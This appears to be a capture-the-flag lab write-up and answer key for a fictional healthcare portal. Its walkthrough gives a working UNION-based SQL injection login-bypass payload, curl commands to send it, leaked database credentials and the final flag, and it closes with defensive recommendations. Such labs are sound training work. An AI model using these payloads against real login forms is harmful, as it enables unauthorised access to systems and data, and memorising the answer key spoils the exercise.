# Vertex Healthcare: SQL Injection to Shell

## Overview

Students perform a web application penetration test against Vertex Healthcare's provider portal. The main site appears to be a simple corporate marketing page, but robots.txt reveals a hidden login portal at `/portal/`. The login form is vulnerable to UNION-based SQL injection in the username field, allowing authentication bypass. After logging in, the dashboard exposes a first assessment token and leaks database credentials. Students then connect directly to the backend MySQL server to extract the second token.

This lab reinforces **SQL injection** as a core web exploitation skill; students must craft a UNION payload that matches the query's column structure to bypass authentication.

## Architecture

```
┌─────────────┐                    ┌─────────────┐
│   Student    │ ──── HTTP:80 ───▶ │   webapp     │
│   (Kali VM)  │                   │ (Flask app)  │
│              │                   └──────┬───────┘
│              │                          │ leaks DB creds
│              │                          ▼
│              │ ── MySQL:3306 ──▶ ┌─────────────┐
│              │  (direct access)  │  dbserver    │
└─────────────┘                    │ (MySQL 8.0)  │
                                   └──────────────┘
```

**Flag parts:**
- Part 1 (`sql1_un10n`): Displayed on the dashboard after SQL injection login bypass
- Part 2 (`3xtr4ct`): Stored in the MySQL `audit_flags` table

## Solution Walkthrough

### Step 1: Initial Reconnaissance

Visit the website:
```bash
curl http://<webapp_ip>/
```

Check robots.txt:
```bash
curl http://<webapp_ip>/robots.txt
```

Output reveals hidden paths:
```
Disallow: /portal/
Disallow: /api/internal/
Disallow: /backups/
```

### Step 2: Discover the Login Portal

```bash
curl http://<webapp_ip>/portal/
```

A login form with username and password fields is presented.

### Step 3: SQL Injection: UNION-Based Authentication Bypass

The login form sends a POST to `/portal/login`. The backend query is:
```sql
SELECT id, username, password, email FROM users WHERE username='$input' AND password='$pass'
```

Craft a UNION injection that returns a controlled row. The injected username:
```
' UNION SELECT 1,'admin','Adm1n_V3rt3x#','admin@vertex.com'-- -
```

With the password field set to `Adm1n_V3rt3x#` (must match the password column in the injected row):

```bash
curl -s -c cookies.txt -X POST http://<webapp_ip>/portal/login \
    -d "username=' UNION SELECT 1,'admin','Adm1n_V3rt3x#','admin@vertex.com'-- -&password=Adm1n_V3rt3x#" -L
```

The application authenticates because the injected row's password field matches the submitted password.

### Step 4: Extract Token 1 from Dashboard

The dashboard displays system status including:

| Component | Value |
|-----------|-------|
| Assessment Token | `sql1_un10n` |

**Token 1:** `sql1_un10n`

### Step 5: Extract Database Credentials

The dashboard's "Application Configuration" panel shows:
```
DB_HOST=vertex-db
DB_PORT=3306
DB_NAME=vertex_portal
DB_USER=vtx_admin
DB_PASS=Vtx_DB_R00t#
```

### Step 6: Connect to MySQL and Extract Token 2

```bash
mysql -h <dbserver_ip> -u vtx_admin -p'Vtx_DB_R00t#' vertex_portal \
    -e "SELECT * FROM audit_flags"
```

Output:
```
+----+---------------------+------------------+
| id | name                | value            |
+----+---------------------+------------------+
|  1 | db_health_check     | healthy_2025Q1   |
|  2 | backup_verification | bkp_verified_0228|
|  3 | assessment          | 3xtr4ct          |
|  4 | schema_version      | v4.1.0_prod      |
+----+---------------------+------------------+
```

**Token 2:** `3xtr4ct`

### Step 7: Assemble Flag

```
OCR{sql1_un10n_3xtr4ct}
```

## Common Mistakes

- **Skipping robots.txt.** The portal path is not linked from any public page. Always check robots.txt first.
- **Using single-column injection.** The UNION must match the number of columns in the original SELECT (4 columns: id, username, password, email).
- **Not matching the password.** The application checks that the password in the returned row matches the submitted password. Your UNION payload must include the same password you enter in the form.
- **Trying parameterized injection techniques.** This is a classic string-concatenation vulnerability; use standard UNION syntax.
- **Ignoring the config panel.** The leaked DB credentials on the dashboard are the key to accessing the database server directly.
- **Using vtx_app instead of vtx_admin.** The vtx_app user only has SELECT on the users table; it cannot read audit_flags.

## Technical Details

- **Web Server:** Python Flask running on port 80 with MySQLdb connector
- **Database:** MySQL 8.0 with two application users (vtx_app for limited access, vtx_admin for broader read access)
- **Vulnerability:** UNION-based SQL injection via string formatting in login query
- **Vulnerability Chain:** Information disclosure (robots.txt) → SQL injection (authentication bypass) → credential leakage (dashboard config) → database access (token extraction)

## Defensive Recommendations

- Always use parameterized queries (prepared statements); never build SQL with string formatting
- Implement input validation and sanitization on all user inputs
- Use a web application firewall (WAF) to detect and block common injection patterns
- Follow the principle of least privilege for database accounts
- Never display database credentials or connection strings in web interfaces
- Use environment variables with proper access controls for sensitive configuration
- Conduct regular code reviews and static analysis to catch injection vulnerabilities
- Use robots.txt for SEO purposes only; it is not a security mechanism
